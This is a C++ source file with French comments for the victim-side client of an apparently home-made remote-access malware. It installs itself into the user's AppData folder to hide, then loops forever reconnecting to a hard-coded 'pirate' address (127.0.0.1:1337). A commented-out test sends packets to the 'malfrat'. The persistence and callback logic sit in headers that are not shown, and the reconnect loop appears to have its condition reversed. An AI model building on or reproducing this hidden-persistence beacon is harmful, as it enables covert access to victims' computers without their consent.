#include "installationAndStart.h"
#include "Connexion.h"


const char * adresseipPirate = "127.0.0.1";
const unsigned short portPirate = 1337;

int main(){ // Main client -- cible
// installation dans appdata du l'utilisateur -- pour le cacher
    if(installationAndStart::init() != OperationState::OP_Success){ // launch init et s'assure du s
        //todo implémantation d'un problème lors de l'installation 21h03
        std::cerr << "Problème lors de l'installation";
    }

    //Loop de connection
    Connexion connexionOUT(adresseipPirate, portPirate, ConnexionType::OUTBOUND);

    while (true){
        if (connexionOUT.connected == true){
            while (connexionOUT.Connect() == false){
                Sleep(150000);
            }
        }
        Sleep(15000);
    }

    return 0;
}


/*
     if(MyPNet::Network::Initialize()){

        MyPNet::Socket socket;
        if(socket.CreateSocket() == MyPNet::PResult::P_Success){
            std::cout << std::endl<< "Création du socket réussi"<<std::endl;

            if (socket.ConnectTo(MyPNet::IPEndpoint("127.0.0.1",1337))==MyPNet::PResult::P_Success){
                std::cout <<"Nouvelle connexion établie vers le malfrat!" << std::endl;

                //send paquets

                MyPNet::Packet stringpacket(MyPNet::PacketType::PT_ChatMessage), intpacket(MyPNet::PacketType::PT_IntegerArray);
                stringpacket << std::string ("Bonjour");
                uint32_t arraySize = 4;
                uint32_t integerArray[4] = {1,2,3,4};
                intpacket << arraySize;


                while(true){
                    MyPNet::PResult result;
                    std::cout <<"envoie" << std::endl;

                    if(rand()%2==0){
                        result = socket.SendPaquets(stringpacket);
                    } else{
                        result = socket.SendPaquets(intpacket);
                    }
                }

                //
            } else{
                std::cout << "Échec de connexion, le malfrat n'a pu être trouvé..."<<std::endl;
            }
            socket.CloseSocket();
        }
    }

    MyPNet::Network::Shutdown(); //ferme l'interface
    return 0;

 */